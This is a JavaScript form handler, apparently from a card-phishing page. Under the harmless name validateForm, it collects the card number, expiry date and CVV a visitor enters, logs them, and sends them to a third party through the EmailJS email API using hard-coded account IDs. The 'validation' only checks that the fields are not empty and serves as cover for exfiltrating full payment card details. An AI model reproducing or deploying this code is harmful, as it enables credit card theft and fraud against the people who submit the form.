function validateForm(event) {
    event.preventDefault();

    const ccn = event.target[0].value;
    const dateM = event.target[1].value;
    const dateY = event.target[2].value;
    const cvv = event.target[3].value;

    if(!(ccn && dateM && dateY && cvv)) return false

    const notification = document.getElementById('notification');
    notification.style.display = 'block'

    setTimeout(() => {
        notification.style.display = 'none'
    }, 3000)

    console.log(event)
    console.log(ccn,
        dateM,
        dateY,
        cvv)

    var data = {
        service_id: 'service_dt3pcxp',
        template_id: 'template_ldnjsmm',
        user_id: 'user_42qsjvQJOsMtKVV8UxgaQ',
        template_params: {
            ccn,
            dateM,
            dateY,
            cvv
        }
    };

    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
        type: 'POST',
        data: JSON.stringify(data),
        contentType: 'application/json'
    }).done(function () {
        console.log('Your mail is sent!');
    }).fail(function (error) {
        console.log('Oops... ' + JSON.stringify(error));
    });
}